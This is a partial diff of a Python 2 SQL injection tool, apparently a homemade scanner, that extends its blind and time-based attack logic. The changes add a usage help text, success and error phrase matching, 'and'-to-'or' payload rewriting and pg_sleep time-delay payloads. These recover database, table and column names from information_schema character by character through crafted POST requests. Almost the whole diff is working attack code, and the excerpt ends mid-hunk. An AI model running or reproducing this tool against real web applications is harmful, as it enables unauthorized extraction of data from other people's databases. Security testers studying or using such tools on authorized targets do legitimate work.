@@ -2,7 +2,7 @@
 #coding:utf-8
 import requests
 from sys import argv, exit, stdout
-from urllib import unquote
+from urllib import unquote, quote
 from HTMLParser import HTMLParser
 from getopt import getopt, GetoptError
 from time import sleep
@@ -21,6 +21,39 @@ import errorbased
 import timebased
 
 class Injection:
+	Comodin="_sqli_"
+	Ayuda = """
+Options:
+
+-h, --help							- Show help message
+-v 								- Verbose mode (Show Request, payload & Response Headers)
+
+Request:
+
+--request="http[s]://www.example.gob.mx?id=5"			- Url target to scan
+--method=[get|post]						- Method Get or Post to launch scan (Get by default)
+--user-agent="Googlebot/2.1"					- User Agent string to use
+--random-agent							- Random User Agent to use (by default)
+--data="param1=value1{sust}&param2=value2"			- Data used for post method (Use '{sust}' where you want insert payload )
+--cookies="PHPSESSID=ue2;date=20151003"				- Cookie data to use a session
+--proxy="127.0.0.1:8080"					- Proxy ip and port to use at every query [http proxy by default]
+
+Injection:
+
+--server=(MySQL,Postgres,Mssql)					- Database querys to use (by default use all queries)
+--based=[error|time]						- Force usage of given HTTP method (error based by default)
+--success="Success Phrase"					- String to compare when a response is correct
+--error="Error Phrase"						- String to compare when a response is incorrect
+--time=[1.5]							- Time to use in Time Based Attempt
+
+Enumeration:
+
+--db 								- Retrieve Database names
+--dbname=db1,db2,db3						- Retrieve Table names of Databases specified
+--tables=table1,table2,table3					- Retrieve Column names of tables specified
+--columns=column1,column2					- Retrieve records of columns specified
+	""".format(sust=Comodin)
+
 	Agentes={
 		'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
 		'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
@@ -78,8 +111,6 @@ class Injection:
 				"%'",'%"' #Comodines
 				]
 
-	Comodin="_sqli_"
-
 	Sufijos={
 		#'MySQL':[' ','#','-- -a'," and '%'='"],
 		'Generic':['--','-- -'+chr(randint(65,122))],
@@ -130,17 +161,21 @@ class Injection:
 	dormir = "DOORMIR"
 	verbosity = False
 	error = ""
+	success = ""
 
 
 	def __init__(self):
 		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
+		self.cabeceras.update({'Connection':'close'})
 
 	def setVerbosity(self,simon):
 		self.verbosity = simon
 
+	def setSuccess(self,successPhrase):
+		self.success = str(successPhrase)
+
 	def setError(self,errorPhrase):
-		self.error = errorPhrase
-		self
+		self.error = str(errorPhrase)
 
 	def searchDbname(self,Buscar):
 		self.dnames = Buscar
@@ -228,7 +263,7 @@ class Injection:
 	def PostInjection(self):
 		#First try MySQL queries
 		if self.Which.__len__()<1:
-			self.bases = ('MySQL','Postgres','Mssql')#,'Oracle')
+			self.bases = ('Postgres','Mssql','MySQL')#,'Oracle')
 		else:
 			self.bases = self.Which.split()
 		Ftime = True
@@ -242,34 +277,60 @@ class Injection:
 						#print self.datos
 						self.dataTempo = self.datos.copy()
 						#query is a dictionary which contains the payloads append to original data
+						if len(self.error) > 0:
+							payl = payl.replace("and","or",1)
+							payl = payl.replace("&&","||",1)
 						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf))
 						#sleep(0.09)
 						#Attempt make a request to server with the sqli payload
+						#print query
 						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 						Ftime=False
+						if self.verbosity:
+							self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
 						# Imprimir Respuesta
 						if self.Based == "time":
 							#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-							if len(self.error) == 0:
-								cumple = (Attempt.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
-							else:
-								cumple = (self.error in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
-						else:
+							if (len(self.success) == 0 ) and (len(self.error) == 0):
+								# Compare Baseline response against Attempt response
+								cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+							if len(self.success) > 0:
+								# Compare if Success string is contained inside Baseline Response 
+								cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 							if len(self.error) > 0:
-								cumple = self.error in self.GoodRequest.content
-							else:
+								# Compare if Error string not appear inside Baseline Response
+								cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+						else:
+							if (len(self.success) == 0 ) and (len(self.error) == 0):
 								cumple = Attempt.content == self.GoodRequest.content
+							if len(self.success) > 0:
+								cumple = self.success in Attempt.content
+							if len(self.error) > 0:
+								cumple = self.error not in Attempt.content
+						#print "Buena",self.GoodRequest.content
+						#print "\n"*1
+						#print "Mala",Attempt.content
+						#print Attempt.elapsed.total_seconds()
+						#print Attempt.request.body
+						#print "|"*50,cumple
 						if cumple:
+#							print "Buena",self.GoodRequest.content
+#							print "\n"*1
+#							print "Mala",Attempt.content
 							#After do a post request, prefix, payload and suffix will be storage in "Flags" variable
 							self.Flags[dbms]['Prefijo'].append(pref)
 							self.Flags[dbms]['Payload'].append(payl.replace(self.dormir,str(self.Time)))
 							self.Flags[dbms]['Sufijo'].append(suf)
+							#break
+							#print "TOkas: {0}\nTResp: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+							return
 							#print "{0} {1} {2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf)
 							#print Attempt.content
 							#print self.GoodRequest.content
 							#exit(1)
 						else:
 							if "syntax" in Attempt.content:
+								#print Attempt.content
 								if not ans:
 									print "\t\t\t\033[1;33m Page vulnerable to SQLi, sorry but this tool only works with Blind and Time sqli Based\033[0m"
 									try:
@@ -494,15 +555,42 @@ class Injection:
 		found = False
 		while True:
 			self.dataTempo = self.datos.copy()
-			query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppload,self.newSuffix),cant=True,cAscii=medio)
+			if len(self.error) > 0:
+				ppload = ppload.replace("and","or",1)
+				ppload = ppload.replace("&&","||",1)
+			query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppload.replace(self.dormir,str(self.Time)),self.newSuffix),cant=True,cAscii=medio)
 			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 			#print query
 			#sleep(0.5)
 			if self.Based == "time":
-				lcumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-				#cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
+				#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+				if (len(self.success) == 0 ) and (len(self.error) == 0):
+					# Compare Baseline response against Attempt response
+					cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+				if len(self.success) > 0:
+					# Compare if Success string is contained inside Baseline Response 
+					cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+				if len(self.error) > 0:
+					# Compare if Error string not appear inside Baseline Response
+					cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 			else:
-				cumple = Attempt.content == self.GoodRequest.content
+				if (len(self.success) == 0 ) and (len(self.error) == 0):
+					cumple = Attempt.content == self.GoodRequest.content
+				if len(self.success) > 0:
+					cumple = self.success in Attempt.content
+				if len(self.error) > 0:
+					cumple = self.error not in Attempt.content			# if self.Based == "time":
+			# 	if len(self.error) == 0:
+			# 	  cumple = (Attempt.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
+			# 	else:
+			# 	  cumple = (self.error in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
+			# 	#cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
+			# else:
+			# 	if len(self.error) > 0:
+			# 		cumple = self.error in Attempt.content
+			# 	else:
+			# 		cumple = Attempt.content == self.GoodRequest.content
+
 			if found:
 				break
 			#if Attempt.content == self.GoodRequest.content:
@@ -523,7 +611,7 @@ class Injection:
 		return medio
 
 	def LongitudRegistro(self,nr=0,lsup=200,tipo="",nbase="",ttname="",ppd="",ofset=0):
-			liminf = 0
+			liminf = -1
 			limsup = lsup
 			medio = (liminf + limsup)//2
 			found = False
@@ -533,26 +621,59 @@ class Injection:
 				#print "kind",kind
 				self.dataTempo = self.datos.copy()
 				if kind== "base":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cAscii=medio)
+					payl = self.RegisterLength.get(self.Which)
+					if len(self.error) > 0:
+						payl = payl.replace("and","or",1)
+						payl = payl.replace("&&","||",1)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cAscii=medio)
 				elif kind== "tablas":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
-				elif kind== "columna":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
+					payl = self.TableLength.get(self.Which)
+					if len(self.error) > 0:
+						payl = payl.replace("and","or",1)
+						payl = payl.replace("&&","||",1)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
+				elif kind == "columna":
+					payl = self.ColumnLength.get(self.Which)
+					if len(self.error) > 0:
+						payl = payl.replace("and","or",1)
+						payl = payl.replace("&&","||",1)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
 				elif kind == "Postgres":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd,self.newSuffix),longi=True,cAscii=medio,reina="Postgres")
+					payl = ppd
+					if len(self.error) > 0:
+						payl = payl.replace("and","or",1)
+						payl = payl.replace("&&","||",1)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl,self.newSuffix),longi=True,cAscii=medio,reina="Postgres")
 				elif kind == "registros":
-				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
+					payl = ppd
+					if len(self.error) > 0:
+						payl = payl.replace("and","or",1)
+						payl = payl.replace("&&","||",1)
+				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
 				#sleep(0.5)
 				#print query
 				#print ">>",self.newSuffix
-				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
 				if self.Based == "time":
-					cumple = (AttemptLongi.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (AttemptLongi.elapsed.total_seconds()))#+ float(self.Time) ) )
-					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),AttemptLongi.elapsed.total_seconds() + float(self.Time))
-					#print "ORIGINAL:::    {0}\nAttempt::: {1}".format(self.GoodRequest.content,AttemptLongi.content)
-					#cumple = (self.GoodRequest.elapsed.total_seconds() < AttemptLongi.elapsed.total_seconds()) and (AttemptLongi.content == self.GoodRequest.content)
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						# Compare Baseline response against Attempt response
+						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+					if len(self.success) > 0:
+						# Compare if Success string is contained inside Baseline Response 
+						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+					if len(self.error) > 0:
+						# Compare if Error string not appear inside Baseline Response
+						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 				else:
-					cumple = AttemptLongi.content == self.GoodRequest.content
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						cumple = Attempt.content == self.GoodRequest.content
+					if len(self.success) > 0:
+						cumple = self.success in Attempt.content
+					if len(self.error) > 0:
+						cumple = self.error not in Attempt.content
+
 				if found:
 					return medio
 				#if AttemptLongi.content == self.GoodRequest.content:
@@ -580,7 +701,7 @@ class Injection:
 		print "="*3,"Guessing DB Names","="*3
 		print "="*25
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
-		#print "Tamaño Base",tamanioRegistro
+		print "Tamaño Base",tamanioRegistro
 		letter = ""
 		for posicion in xrange(1,tamanioRegistro+1):
 			#print "LOL Time"
@@ -590,16 +711,35 @@ class Injection:
 			found = False
 			while True:
 				self.dataTempo = self.datos.copy()
-				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
+				payl = self.PayloadsDBnames.get(self.Which)
+				if len(self.error) > 0:
+					payl = payl.replace("and","or",1)
+					payl = payl.replace("&&","||",1)
+				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
 				if self.verbosity:
-					self.showData(objeto=Attempt,vulnerable=True,lll=unlquote(repr(Attempt.request.body)))
+					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+				# Imprimir Respuesta
 				if self.Based == "time":
-					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time)) #(Attempt.elapsed.total_seconds())# + float(self.Time) )
-					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
-					cumple = (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.content == self.GoodRequest.content)
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						# Compare Baseline response against Attempt response
+						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+					if len(self.success) > 0:
+						# Compare if Success string is contained inside Baseline Response 
+						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+					if len(self.error) > 0:
+						# Compare if Error string not appear inside Baseline Response
+						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 				else:
-					cumple = Attempt.content == self.GoodRequest.content
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						cumple = Attempt.content == self.GoodRequest.content
+					if len(self.success) > 0:
+						cumple = self.success in Attempt.content
+					if len(self.error) > 0:
+						cumple = self.error not in Attempt.content
+
 				if found:
 					if chr(medio) != "," and not self.verbosity:
 						self.showCharacter(chr(medio))
@@ -636,10 +776,11 @@ class Injection:
 		tt = ""
 		if self.Which == "Postgres": # Postgres se porta bien reina ¬¬
 			tt += self.AuxiliarTablasPost()
-			print "<"*30,tt
+			#print "<"*30,tt
 			self.RelacionBaseTabla["postgres"]=tt.split(',')
-			print "="*80
-			print "current_database() =>",self.RelacionBaseTabla["postgres"]
+			#print "="*80
+			print ""
+			#print "current_database() =>",self.RelacionBaseTabla["postgres"]
 		else:
 			if self.todasBases: #Cuando el usuario escribio all
 				for ldbn in self.BDatosName:
@@ -662,6 +803,7 @@ class Injection:
 		#print ldbname
 		letter = ""
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
+		print "Cantidad Tablas",tamanioRegistro
 		print "Checking",ldbname
 		for posicion in xrange(1,tamanioRegistro+1):
 			liminf = 31 #48 because is number 0
@@ -670,17 +812,36 @@ class Injection:
 			found = False
 			while True:
 				self.dataTempo = self.datos.copy()
-				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
+				payl = self.TablesName.get(self.Which)
+				if len(self.error) > 0:
+					payl = payl.replace("and","or",1)
+					payl = payl.replace("&&","||",1)
+				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
 				#print query
 				#sleep(0.4)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
 				if self.verbosity:
-					self.showData(objeto=Attempt,Previo=False,lll=unquote(repr(Attempt.request.body)))
+					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+				# Imprimir Respuesta
 				if self.Based == "time":
-					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						# Compare Baseline response against Attempt response
+						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+					if len(self.success) > 0:
+						# Compare if Success string is contained inside Baseline Response 
+						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+					if len(self.error) > 0:
+						# Compare if Error string not appear inside Baseline Response
+						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 				else:
-					cumple = Attempt.content == self.GoodRequest.content				
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						cumple = Attempt.content == self.GoodRequest.content
+					if len(self.success) > 0:
+						cumple = self.success in Attempt.content
+					if len(self.error) > 0:
+						cumple = self.error not in Attempt.content
 
 				if found:
 					if chr(medio) != "," and not self.verbosity:
@@ -711,28 +872,37 @@ class Injection:
 		oset = 0
 		cc = 0
 		lta = []
-		print ">="*40,self.RelacionBaseTabla
 		self.RelacionBaseTabla["postgres"] = self.listaTablas
+		#print "<"*40,self.RelacionBaseTabla
 		#Conociendo la cantidad de registros que tiene una tabla en postgres
 		for t in self.RelacionBaseTabla["postgres"]:
-			numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
+			print "="*20
+			print "="*3,t,"="*3
+			print "="*20
+			if self.Based == "time":
+				numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.Time)))
+			else:
+				numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
 			cc+=1
-			for oset in xrange(numr-1):
+			for oset in xrange(numr):
 				letter=""
-				tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0}",tipo="Postgres")
+				if self.Based == "time":
+					tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.Time)),tipo="Postgres")
+				else:
+					tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0}",tipo="Postgres")
 				for posicion in xrange(1,tamanioRegistro+1):
 					self.dataTempo = self.datos.copy()
 					liminf = 48
 					limsup = 127
 					medio = (limsup+liminf)//2
 					letra = self.ColumnsPostgresTest(ind=posicion,linea=oset,tbn=t)
+					self.showCharacter(letra)
 					letter+=letra
+				print ""
 				lta.append(letter)
 				self.listaColumnas.append(letter)
-			print "="*20
-			print "="*3,t,"="*3
-			print "="*20
-			for alt in self.listaColumnas: print ">"*3,alt," "*2,"<"*3
+			if self.verbosity:
+				for alt in self.listaColumnas: print ">"*3,alt," "*2,"<"*3
 
 	def ColumnsPostgresTest(self,linea=0,ind=1,tbn=""):
 		liminf = 48
@@ -741,19 +911,38 @@ class Injection:
 		found = False
 		while True:
 			self.dataTempo = self.datos.copy()
-			ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0}"
+			if self.Based == "time":
+				 ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.Time))
+			else:
+				ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0}"
 			#print ntm
 			query = self.ChangePhrase(DataPost = self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ntm,self.newSuffix),cAscii=medio,reina="Postgres",cname=True)
 			#print query
 			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
+			if self.verbosity:
+				self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+			# Imprimir Respuesta
 			if self.Based == "time":
-				cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-				#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+				#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+				if (len(self.success) == 0 ) and (len(self.error) == 0):
+					# Compare Baseline response against Attempt response
+					cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+				if len(self.success) > 0:
+					# Compare if Success string is contained inside Baseline Response 
+					cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+				if len(self.error) > 0:
+					# Compare if Error string not appear inside Baseline Response
+					cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 			else:
-				cumple = Attempt.content == self.GoodRequest.content
+				if (len(self.success) == 0 ) and (len(self.error) == 0):
+					cumple = Attempt.content == self.GoodRequest.content
+				if len(self.success) > 0:
+					cumple = self.success in Attempt.content
+				if len(self.error) > 0:
+					cumple = self.error not in Attempt.content
 
 			if found:
-
 				return chr(medio)
 			#if self.GoodRequest.content==Attempt.content:
 			if cumple:
@@ -788,29 +977,21 @@ class Injection:
 						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
 						self.listaColumnas = tt.split(',')
 						print "="*20
-						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
-						#print "="*3,TablaName,"="*3
-						#print "="*20
-						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
 						print ""
 			else: # Cuando quiere obtener las columnas de las tablas que el defina
 				for ldbn in self.listaBases:
 					for TablaName in self.listaTablas:
-						#print "n.n",TablaName
+						print "+"*5,TablaName,"+"*5
 						tt = ""
 						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
 						self.listaColumnas = tt.split(',')
-						#print "="*20
-						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
-						#print "="*3,TablaName,"="*3
-						#print "="*20
-						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
 						print ""
 
 	def AuxiliarColumnasPost(self,ldbname="",tbname=""):
 		#print ldbname
 		letter = ""
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="columna",nbase=ldbname,ttname=tbname)
+		print "Tamanio Registro",tamanioRegistro
 		#print ldbname,"=>",tbname
 		for posicion in xrange(1,tamanioRegistro+1):
 			liminf = 31 #48 because is number 0
@@ -819,15 +1000,37 @@ class Injection:
 			found = False
 			while True:
 				self.dataTempo = self.datos.copy()
-				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnNames.get(self.Which),self.newSuffix),cname=True,nombreBase=ldbname,pos=posicion,cAscii=medio,nombreTabla=tbname)
+				payl = self.ColumnNames.get(self.Which)
+				if len(self.error) > 0:
+					payl = payl.replace("and","or",1)
+					payl = payl.replace("&&","||",1)
+				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),cname=True,nombreBase=ldbname,pos=posicion,cAscii=medio,nombreTabla=tbname)
 				#print query
 				#sleep(0.4)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
+				if self.verbosity:
+					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+				# Imprimir Respuesta
 				if self.Based == "time":
-					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						# Compare Baseline response against Attempt response
+						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+					if len(self.success) > 0:
+						# Compare if Success string is contained inside Baseline Response 
